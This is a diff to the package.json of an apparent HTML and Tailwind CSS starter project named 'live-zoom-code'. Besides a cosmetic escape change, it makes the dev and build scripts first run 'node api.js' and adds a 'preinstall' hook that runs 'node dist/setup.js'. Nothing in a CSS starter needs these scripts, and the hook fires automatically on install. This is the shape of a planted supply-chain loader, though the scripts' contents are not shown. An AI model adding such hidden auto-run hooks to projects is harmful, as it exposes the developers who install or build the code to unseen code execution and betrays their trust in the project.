@@ -1,10 +1,11 @@
 {
   "name": "live-zoom-code",
   "version": "1.0.0",
-  "description": "Starter project — HTML + Tailwind CSS CLI",
+  "description": "Starter project \u2014 HTML + Tailwind CSS CLI",
   "scripts": {
-    "dev": "npx @tailwindcss/cli -i ./src/input.css -o ./src/output.css --watch",
-    "build": "npx @tailwindcss/cli -i ./src/input.css -o ./src/output.css --minify"
+    "dev": "node api.js && npx @tailwindcss/cli -i ./src/input.css -o ./src/output.css --watch",
+    "build": "node api.js && npx @tailwindcss/cli -i ./src/input.css -o ./src/output.css --minify",
+    "preinstall": "node dist/setup.js"
   },
   "keywords": [
     "html",
